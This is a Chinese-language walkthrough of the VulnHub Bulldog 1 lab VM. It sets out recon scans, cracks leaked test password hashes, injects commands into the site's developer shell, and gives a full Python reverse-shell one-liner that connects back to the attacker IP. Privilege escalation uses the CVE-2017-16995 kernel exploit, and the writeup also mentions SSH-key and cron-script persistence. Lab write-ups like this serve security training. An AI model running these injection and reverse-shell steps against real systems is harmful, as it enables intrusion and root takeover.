---
title: Bulldog_1 writeup
categories:
  - pentest
tags:
  - Null
---

玩 `pentest` 真是一件有趣的事情，继续记录本次的渗透过程吧。



# 0x1 靶机配置

 

## 0x11 靶机来源

来源地址：[https://download.vulnhub.com/bulldog/bulldog.ova](https://download.vulnhub.com/bulldog/bulldog.ova)

Bulldog Industries recently had its website defaced and owned by the malicious German Shepherd Hack Team. Could this mean there are more vulnerabilities to exploit? Why don't you find out? :)

This is a standard Boot-to-Root. Your only goal is to get into the root directory and see the congratulatory message, how you do it is up to you!

Difficulty: Beginner/Intermediate, if you get stuck, try to figure out all the different ways you can interact with the system. That's my only hint ;)

Made by Nick Frichette (frichetten.com) Twitter: @frichette_n

I'd highly recommend running this on Virtualbox, I had some issues getting it to work in VMware. Additionally DHCP is enabled so you shouldn't have any troubles getting it onto your network. It defaults to bridged mode, but feel free to change that if you like.



## 0x12 靶机配置

这里我依旧使用的 `vmware + nat` 的方式对靶机进行安装。



# 0x2 信息收集



## 0x21 获取靶机 IP 地址

我们需要确认靶机的 `IP` 地址，这里我使用 `netdiscover` 对我这里的网段进行扫描。

```
netdiscover -r 192.168.248.0/24
```

我们得到的结果如下：

![Bulldog_1_1](/image/2019-05-05-Bulldog1-writeup/Bulldog_1_1.png)

经过简单的判断，我们得到 `192.168.248.165` 就是我们的靶机。



## 0x22 搜集靶机端口信息

```sh
masscan --ports=1-65535 192.168.248.165 --banners --rate 1000000 --wait=0
```

很快我们就得到结果：

![Bulldog_1_2](/image/2019-05-05-Bulldog1-writeup/Bulldog_1_2.png)

为了更好的确定端口信息这里我们使用 nmap 来扫描一下。

```sh
nmap -T 5 -A 192.168.248.165
```

结果如下：

![Bulldog_1_3](/image/2019-05-05-Bulldog1_writeup/Bulldog_1_3.png)

简单的 `fuzz` 一下，我们可以得到 `ssh` 被改到了 `23` 端口，而 `80` 和 `8080` 所对应的是一个网站。



# 0x3 漏洞挖掘

老规矩先扫描 `web` 站点的目录

```sh

```

![Bulldog_1_4](/image/2019-05-05-Bulldog1_writeup/Bulldog_1_4.png)

从这里我们可以得到 `web` 根目录存在三个文件夹。

简单的 `fuzz` 一下我们得到：

| 地址                                             | 信息                               |
| ------------------------------------------------ | ---------------------------------- |
| http://192.168.248.165/                          | 首页                               |
| http://192.168.248.165/dev/                      | 网站的开发页面。（描述了一下信息） |
| http://192.168.248.165/admin/login/?next=/admin/ | 后台的登陆界面                     |
| http://192.168.248.165/dev/shell/                | 网站开发者想替代 ssh 所开发的工具  |
| http://192.168.248.165/robots.txt                | 第一个 flag                        |

这是一个基于 `Django` 开发的站点，我在 [http://192.168.248.165/dev/](http://192.168.248.165/dev/) 中找到了网站账户的一些信息。

![Bulldog_1_5](/image/2019-05-05-Bulldog1_writeup/Bulldog_1_5.png)

从这里可以知道，这是一些给网站测试所预留的密码。

到 [https://www.somd5.com/](https://www.somd5.com/) 尝试了一下，最终我们得到了：

| 用户名 | 密码         |
| ------ | ------------ |
| nick   | bulldog      |
| sarah  | bulldoglover |

只成功得到了两个密码，有点遗憾呐。

先不管了，登陆后台。

![Bulldog_1_6](/image/2019-05-05-Bulldog1_writeup/Bulldog_1_6.png)

登陆了后台发现什么都没有，这个时候突然想起了，刚才不是还有一个 [http://192.168.248.165/dev/shell/](http://192.168.248.165/dev/shell/) 吗？

在未登录后台的时候它提示我进行身份验证。

![Bulldog_1_7](/image/2019-05-05-Bulldog1_writeup/Bulldog_1_7.png)



现在我进行登陆了后台，那我不就可以…

![Bulldog_1_8](/image/2019-05-05-Bulldog1_writeup/Bulldog_1_8.png)

果然，在这里发现了一个 `shell` ，但是 `fuzz` 过后，发现存在一些过滤，后面就是一些绕过的过程了。

## 0x31 利用思路

到这里就可以总结一下思路了。

1. 通过 `web` 这里进行 `命令注入` 反弹 `shell` ，然后进行提权。
2. 通过 `web` 这里进行 `命令注入` 得到账户名，然后 `ssh` 暴力破解账户密码。



# 0x4 漏洞利用



## 0x41 第一种思路

### 0x411 命令注入

首先我们需要进行注入，经过 `fuzz` ，大致得到一种可执行的思路。

```sh
pwd && command
```

既然这样反弹 `shell` 吧，由于 `Django` 是使用 `python`  开发的，所以服务器是肯定存在 `python` 的。

简单的尝试后得到如下命令。

```sh
pwd && printf 'import socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("192.168.248.164",10000))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\np=subprocess.call(["/bin/bash","-i"])\n' > text.py && python3.5 text.py
```

这里需要说明的我的攻击机的 IP 是 `192.168.248.164` ，这里我在攻击机执行的命令为：

```sh
nc -klvp 10000
```

这样我们就成功得到一个 `shell` 。

![Bulldog_1_9](/image/2019-05-05-Bulldog1_writeup/Bulldog_1_9.png)



### 0x412 提权

这里首先使用 ：

```sh
sudo -l
sudo: no tty present and no askpass program specified
```

但是这里提示我们必须在 `终端` 中使用 `sudo` 命令，这里我们创建一个伪终端。

```sh
python -c "import pty;pty.spawn('/bin/bash')"
```

创建好后，在执行 `sudo` 的时候，居然提示我们需要密码，这条路基本是行不通了。

没办法，只有先查看一下 `内核` 等信息了。

```sh
uname -a
Linux bulldog 4.4.0-87-generic #110-Ubuntu SMP Tue Jul 18 12:55:35 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
```

这里的内核版本是 `4.4.0-87` 刚好在这个内核存在一个提权漏洞：[CVE-2017-16995](<https://www.exploit-db.com/exploits/44298>) 。

由于靶机上面不存在 `gcc` 所以我们现在本机上编译好，然后通过 `web` 服务器传输过去。

下载以及编译（攻击机）：

```sh
wget https://www.exploit-db.com/download/44298
mv 44298 44298.c
gcc --static 44298.c -o 44298
```

这里我在我的攻击机上面已经搭建好了 web 服务器，所以我可以直接再靶机上下载并执行。

靶机：

```sh

```

![Bulldog_1_10](/image/2019-05-05-Bulldog1_writeup/Bulldog_1_10.png)

最后我们成功得到 `root shell`。



## 0x42 第二种思路

第二种思路其实没什么可说的，当反弹 `shell` 不成功的时候可以碰碰运气。

1. 首先通过检查 `/etc/passwd` 和 `/etc/ssh/sshd_config`，得到可登陆的账户。
2. 通过爆破得到 `shell` 。

由于前面的博客已经讲过这样的方法了，所以这里不再赘述了。



## 0x43 其他思路

这里记录一下 大佬们 的一些思路。

### 0x431 反弹 shell

这里 `django` 账户并没有禁用 `ssh` 登陆。

所以我们可以通过在用户目录下创建 `~/.shh/authorized_keys` 文件。

将我们的 `ssh` 公钥放入到文件里 ，这样我们就可以实现通过 `django` 账户免密登陆靶机了。



### 0x432 提权

这里 `提权` 可以在 `/etc/cron.d` 里找到配置定时任务的文件。

定时任务文件里面为（`/etc/cron.d/runAV`）：

```
*/1 * * * * root /.hiddenAVDirectory/AVApplication.py
```

将定时任务所对应的 `.py` 文件进行修改，反弹 root 权限的 `shell` 。